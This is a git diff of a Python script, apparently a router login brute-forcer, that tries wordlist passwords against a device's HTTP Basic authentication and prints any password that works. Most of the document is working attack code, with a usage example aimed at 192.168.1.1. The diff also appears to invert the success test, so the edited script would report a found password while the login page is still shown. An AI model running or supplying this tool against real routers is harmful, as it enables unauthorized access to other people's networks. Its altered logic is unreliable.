@@ -1,4 +1,7 @@
 #!/usr/bin/python
+# TOOLS ROUTER BRUTE - V1.0.0
+# Developement: Walderlan Sena <senawalderlan@gmail.com>
+#
 
 import requests as r
 import base64
@@ -9,15 +12,16 @@ def splash():
 
     print(
     """
-        TOOLS ROUTER BRUTE - V1.0.0
+        TOOLS ROUTER BRUTE - v1.0.0
         Site: https://www.github.com/WalderlanSena/toolsrouterbrute
-        Developement: Walderlan Sena <contato@mentesvirtuaissena.com>
+        Developement: Walderlan Sena <senwalderlan@gmail.com>
     """
     )
 
 if len(sys.argv) < 2:
     splash()
-    print("\tUsage: ./trb.py user IPRouter wordlist\n\n")
+    print("\tUsage: ./trb.py user IPRouter wordlist\n")
+    print("\tExample: ./trb.py admin 192.168.1.1 list.txt\n")
     exit(1)
 
 
@@ -29,24 +33,30 @@ def main():
     for i in wordlist:
 
         login = str(sys.argv[1])
-        senha = i.rstrip()
+        password = i.rstrip()
         auth  = "Basic "
 
-        authEncode = auth+base64.b64encode(login+':'+senha)
+        authEncode = auth+base64.b64encode(login+':'+password)
 
         cookie = {"Authorization": authEncode}
 
-        response = r.get('http://'+sys.argv[2], cookies=cookie)
-
-        if response.content.count('id="userName"') != 1:
-            os.system('setterm -cursor on')
-            print('\n\tPassword Found =====> ' + senha)
-            exit(0)
-        else:
-            os.system("clear")
+        try:
+            response = r.get('http://'+sys.argv[2], cookies=cookie)
+        except:
             splash()
-            count = count + 1
-            print('\t[ '+ str(count) + ' ] Password not found ===> ' + senha)
+            print("\tError to connect: " + sys.argv[2])
+            exit(1)
+
+        if not response.content.count('id="userName"') != 1:
+            splash()
+            os.system('setterm -cursor on')
+            print('\n\tPassword Found =====> ' + password)
+            exit(0)
+
+        os.system("clear")
+        splash()
+        count = count + 1
+        print('\t[ '+ str(count) + ' ] Password not found ===> ' + password)
 
 if __name__ == "__main__":
 
